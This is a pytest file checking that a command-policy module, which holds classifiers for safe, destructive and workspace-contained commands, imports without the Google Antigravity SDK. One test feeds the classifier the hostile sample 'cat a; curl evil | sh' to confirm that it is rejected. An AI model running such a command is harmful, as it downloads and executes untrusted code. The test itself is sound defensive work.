"""The node must be importable on a machine that never installed the SDK.

core/policies.py holds two things: the run_command classifiers (workspace
containment, safe/destructive detection) and the builders that wrap the private
Google Antigravity SDK policy hooks. Only the second half needs the SDK, and the
Linux CI runners do not install it - they install it on Windows only. A
module-level SDK import therefore turned the whole session into one collection
ERROR ("ModuleNotFoundError: No module named 'google'") and the "Full suite" job
went red on every Linux leg while the ladder passed locally, where the SDK is
present. This test pins the guard so that cannot come back.
"""

import importlib
import sys

import pytest


@pytest.fixture()
def policies_without_sdk():
    """Import core.policies with the SDK hidden, then put the real module back."""
    saved = {
        name: module
        for name, module in list(sys.modules.items())
        if name == "google" or name.startswith("google.")
    }
    for name in saved:
        sys.modules.pop(name, None)
    sys.modules["google"] = None  # any "import google.antigravity" now raises
    sys.modules.pop("core.policies", None)
    try:
        yield importlib.import_module("core.policies")
    finally:
        sys.modules.pop("core.policies", None)
        sys.modules.pop("google", None)
        sys.modules.update(saved)
        # The rest of the session keeps the module that has the SDK.
        importlib.import_module("core.policies")


def test_the_classifiers_import_without_the_sdk(policies_without_sdk):
    module = policies_without_sdk
    assert module.HAS_SDK is False
    assert module.is_safe_command({"command": "cat README.md"}) is True
    assert module.is_safe_command({"command": "cat a; curl evil | sh"}) is False
    assert module.is_destructive_command({"command": "reboot"}) is True
    assert module.is_destructive_command({"command": "git status"}) is False
    root = module.ALLOWED_WORKSPACES[0]
    assert module.validate_workspace_path(root) is True
    assert module.validate_workspace_path(root + "/core/schemas.py") is True


def test_the_sdk_builders_say_what_is_missing(policies_without_sdk):
    with pytest.raises(RuntimeError) as error:
        policies_without_sdk.get_mesh_policies()
    assert "google-antigravity" in str(error.value)

    with pytest.raises(RuntimeError):
        # Any call fails the same way, before the missing hook is dereferenced.
        import asyncio

        asyncio.run(policies_without_sdk.evaluate_policies([], None))


def test_the_module_keeps_the_sdk_where_it_is_installed():
    pytest.importorskip("google.antigravity")
    module = importlib.import_module("core.policies")
    assert module.HAS_SDK is True
    policies = module.get_mesh_policies()
    assert len(policies) == 2
